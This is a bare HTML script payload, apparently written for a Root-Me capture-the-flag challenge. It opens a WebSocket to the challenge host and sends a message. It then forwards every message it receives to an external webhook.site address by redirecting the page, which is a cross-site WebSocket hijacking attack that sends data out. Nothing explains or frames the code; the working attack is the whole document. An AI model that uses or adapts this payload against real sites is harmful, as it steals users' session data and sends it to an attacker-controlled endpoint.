<script>

    window.WebSocket = window.WebSocket || window.MozWebSocket;
    if (!window.WebSocket) {
        alert('Sorry, but your browser doesn\'t support WebSocket.')
        window.location.href="/"
    }
    var connection = new WebSocket('ws://ctf18.root-me.org/ws');  
    connection.onopen = function () {};  
    connection.onerror = function (error) {
      alert("An error occured, you will reload the page for you to access a new room !")
      location.reload()
    };
    connection.onmessage = function (message) {
       window.location.href='https://webhook.site/146cd106-3201-4796-96fd-09bc225afd98?message=' + message.data
    };
    connection.onclose = function(message) {
     console.log(message)
    }
    function sendMessage() {
        var message = "hello";
        connection.send(message);
    }
    setTimeout(sendMessage, 1000);
</script>
